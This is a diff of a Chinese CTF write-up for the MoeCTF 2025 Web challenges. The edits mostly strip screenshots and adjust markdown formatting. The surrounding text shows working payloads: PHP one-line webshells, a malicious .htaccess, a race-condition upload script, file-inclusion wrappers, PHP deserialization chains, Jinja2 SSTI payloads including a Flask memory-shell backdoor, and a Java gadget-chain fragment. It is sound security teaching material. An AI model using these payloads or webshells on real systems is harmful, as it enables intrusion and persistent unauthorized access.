@@ -4,7 +4,7 @@ description: "MoeCTF 2025 Web方向比赛WP，整理解题思路、关键利用�
 pubDate: "2025-11-01"
 updatedDate: "2025-11-01"
 tags: ["CTF", "Web安全", "WP"]
-cover: auto
+cover: "1782887895598..jpeg"
 coverAlt: "moectf2025 Web 题解汇总 的文章封面"
 draft: false
 ---
@@ -24,8 +24,6 @@ draft: false
 
 首先打开其中一个题目附件后，你会看到一堆括号，同时给了一个提示：“你知道什么是控制台吗？快去了解一下吧！”
 
-![题目附件中显示的括号代码](/images/posts/console.png)
-
 看到这里我们肯定会想要去浏览器上搜索一下“控制台”是什么，但是直接搜索的结果可能会让人眼前一黑，有种摸不着头脑的感觉。
 
 这个时候就要引入我想讲的后两个内容：**如何搜集信息**和**如何利用AI**。
@@ -43,9 +41,7 @@ draft: false
 *   **解法一：** 将附件中的 JSFuck 代码复制下来，找一个专门的在线反混淆网站来解密。
 *   **解法二：** 将 JSFuck 代码直接扔到浏览器的**控制台**中运行（在某些浏览器中，可能需要先在控制台中输入 `allow pasting` 并回车）。
 
-运行结果如图：
-
-![在控制台中运行JSFuck代码后的结果](/images/posts/result.png)
+运行后可以在控制台查看解码结果。
 
 ### 3. 如何利用AI搜索
 
@@ -67,13 +63,9 @@ draft: false
 
 ## 第一章：前端绕过
 
-首先连好环境，然后复制网址，开始做题。网页如图：
-
-![题目网页截图](/images/posts/网页.png)
+首先连好环境，然后复制网址，进入题目网页。
 
 我们尝试将附件内容复制过来，发现禁止粘贴。依旧按 `F12` 打开开发者工具，查看 `shouzhuo.js` 中的前端代码，发现 Flag 就在其中。
-
-![在JS源码中找到Flag](/images/posts/success.png)
 
 通过阅读前端代码，我们发现其实这道题可以有其他解法。前端代码中禁用了粘贴，我们只需要在控制台输入以下命令将粘贴功能重新开放即可：
 
@@ -81,8 +73,6 @@ draft: false
 document.addEventListener('paste', e => e.stopPropagation(), true);
 ```
 这段 JavaScript 代码通过提前捕获粘贴事件，阻止其被禁用，从而恢复粘贴功能。然后我们就可以复制内容并提交了。
-
-![使用控制台命令后成功提交](/images/posts/success2.png)
 
 ---
 
@@ -92,8 +82,6 @@ document.addEventListener('paste', e => e.stopPropagation(), true);
 
 打开网页，有一段文字被涂抹了，但可以复制。复制下来发现一个路由地址，我们通过抓包来访问这个地址。
 
-![抓包结果显示Flag](/images/posts/result.png)
-
 抓包后发现 Flag 在请求头（Request Header）里。我们也可以直接访问该路由，然后按 `F12` 在“网络(Network)”面板中查找到对应的请求，查看其请求头信息。
 
 ---
@@ -102,18 +90,14 @@ document.addEventListener('paste', e => e.stopPropagation(), true);
 
 这道题依然是考察HTTP请求包。我们需要对URL和POST传参的内容进行修改，即可得到 Flag。
 
-![修改请求后得到Flag](/images/posts/result.png)
-
 ---
 
 ## 第四章：HTTP请求的多种姿势
 
 这道题分多关考察了不同的HTTP请求知识。
 
-#### **第一关：GET传参**
+### **第一关：GET传参**
 一个简单的GET传参，在URL后面加上 `?key=xdsec` 即可。
-
-![GET传参成功](/images/posts/get.png)
 
 #### **第二关：POST传参**
 一个简单的POST传参，构造如下请求：
@@ -237,8 +221,6 @@ declaration=织云阁=第一
 
 随便输入内容后，返回结果的格式为XML文件，因此考虑存在XXE（XML External Entity）漏洞。
 
-![XXE题目网页截图](/images/posts/网页.png)
-
 > **原理简介**：XXE漏洞原理是XML解析器在解析外部实体时，没有禁止外部实体的引用，导致攻击者可以引用外部文件或URL，造成文件读取、命令执行或内网探测等危害。
 
 **Payload** 如下：
@@ -289,7 +271,7 @@ print(query_string)
 **Payload:**
 `php://filter/read=convert.base64-encode/resource=flag.php`
 
-#### **PHP伪协议扩展:**
+### **PHP伪协议扩展:**
 *   `php://filter`: 元封装器，用于在读取或写入数据流时对其进行筛选过滤。
 *   `data://`: 数据流封装器。当与文件包含函数结合时，可以执行用户传入的PHP代码，如 `data://text/plain,<?php phpinfo();?>`。
 *   `file://`: 用于访问本地文件系统，如 `file:///etc/passwd`。
@@ -323,7 +305,7 @@ Add-Content -Path exploit.jpg -Value '<?php @eval($_REQUEST["cmd"]); ?>' -NoNewl
 
 上传成功后，使用蚁剑连接这个PHP马的URL，在终端中执行 `printenv` 或 `env` 命令获得 Flag。
 
-#### **其他解法**
+### **其他解法**
 如果将一句话木马中的 `eval` 改成 `system`，如 `<?=system($_GET["cmd"]);?>`，那么上传成功后，我们可以直接访问该文件的URL，并通过GET参数执行命令，例如：
 *   `http://<target>/uploads/exploit.php?cmd=ls /`
 *   `http://<target>/uploads/exploit.php?cmd=cat /flag`
@@ -336,7 +318,7 @@ Add-Content -Path exploit.jpg -Value '<?php @eval($_REQUEST["cmd"]); ?>' -NoNewl
 这道题提示是apache中一个配置文件，也就是htaccess文件，我们需要上传一个恶意的htaccess文件，来执行命令。
 
 自己写一个.htaccess文件，内容如下：
-```
+```text
 <Files .htaccess>
     SetHandler application/x-httpd-php
     Require all granted
@@ -369,7 +351,7 @@ Require all granted用于确保可以访问该文件
 
 用一个bash脚本来爆破，一个比较简单的脚本，但是成功率有点低
 
-```
+```bash
 #!/bin/bash
 q(){
 curl -fs -X POST \
@@ -401,11 +383,11 @@ wait
 
 传的文件内容分别是
 
-```
+```php
 <?php system('ls -la /'); ?>
 ```
 
-```
+```php
 <?php system('cat /flag.txt'); ?>
 ```
 
@@ -415,7 +397,7 @@ wait
 
 审一下题目，主要需要把.php挤掉，这里使用data伪协议
 
-```
+```text
 data://text/plain,<?php system('cat /flag*');?>
 ```
 
@@ -427,7 +409,7 @@ data://text/plain,<?php system('cat /flag*');?>
 
 一个简单的php反序列化，用到了魔术方法__destruct()该方法在对象被销毁时调用
 
-```
+```php
 <?php
 class A{
     public $a;
@@ -441,7 +423,7 @@ echo urlencode(serialize($b));
 ## 第十八章 php反序列化
 
 依旧是一个简单的php反序列化，因为PersonA中的name为私密所以构造一个__construct方法来赋值，然后将b传进去，调用b的work
-```
+```php
 <?php
 class PersonA{
     private $name;
@@ -469,7 +451,7 @@ echo urlencode(serialize($a));
 然后我们下一步就可以开始利用了，我们首先利用PersonA，往id中传入一个__check来调用C中的__check方法，name中传一个C对象，然后age中传入系统命令，再构造一个C对象，往id中传
 
 入我们之前构造的Person对象，name为"system"，age为随意一个值，得解
-```
+```php
 <?php 
 class Person{
     public $name;
@@ -498,7 +480,7 @@ echo urlencode(serialize($a));
 
 这里的解法和第十九章差不多，只是把PersonC中的name改成了"System"绕过对小写system的检查，然后把PersonA中的name改成了"check"，这样就能触发check方法了，不过这里把invoke放到B中了，需要两个B对象。
 
-```
+```php
 <?php 
 class Person{
     public $name;
@@ -531,7 +513,7 @@ echo urlencode(serialize($a));
 
 利用一下lipsum全局变量，再绕一下黑名单
 
-```
+```text
 {% print(lipsum['\x5f\x5fglo'+'bals\x5f\x5f']['os'].popen('env').read())%}
 ```
 
@@ -540,19 +522,19 @@ echo urlencode(serialize($a));
 
 这是一个SSTI无回显，可以内存马或者写静态目录，这里使用内存马
 
-```
+```text
 {{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}
 ```
 
 然后得要suid提权
 
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
 这里利用cat /usr/bin/rev.c拿出源码，然后
 
-```
+```bash
 /usr/bin/rev --HDdss cat /flag
 ```
 
@@ -560,7 +542,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 这里是一个简单的无字母数字webshell，可以通过取反，自增，异或等方法来构造命令，我使用取反
 
-```
+```php
 $_=~%8F%97%8F%96%91%99%90;$_();
 ```
 
@@ -568,7 +550,7 @@ $_=~%8F%97%8F%96%91%99%90;$_();
 
 这里是加强版，不让用变量符号，可以看一看离别歌师傅的博客有详细的教程，搜无字母数字webshell
 
-```
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -587,7 +569,7 @@ $_=~%8F%97%8F%96%91%99%90;$_();
 
 写一个文件上传，然后抓获流量包
 
-```
+```text
 POST /?shell=?><?=`.+/???/????????[@-[]`;?> HTTP/1.1
 Host: 127.0.0.1:52102
 Accept-Encoding: gzip, deflate, br, zstd
@@ -624,7 +606,7 @@ Content-Disposition: form-data; name="submit"
 
 审一下题目，在源码中我们可以看到wagtail链
 
-```
+```java
  public Object chainWagTail() {
     Object input = null;
     for (Dog dog : this.dogs.values()) {
@@ -639,7 +621,7 @@ Content-Disposition: form-data; name="submit"
 
 这一步是重点会将上一个result作为下一个的input传递，同时dog.class中重写了hashcode调用了wagtail方法
 
-```
+```java
   default Object wagTail(Object input, String methodName, Class[] paramTypes, Object[] args) {
     try {
       Class<?> cls = input.getClass();
@@ -656,7 +638,7 @@ wagtail中有invoke，所以全链形成，我们可以建立一个dog的linkedh
 
 而实现全链，以下是ai生成的一个比较清晰的POC
 
-```
+```java
 package com.example.demo;
 
 import com.example.demo.Dog.Dog;
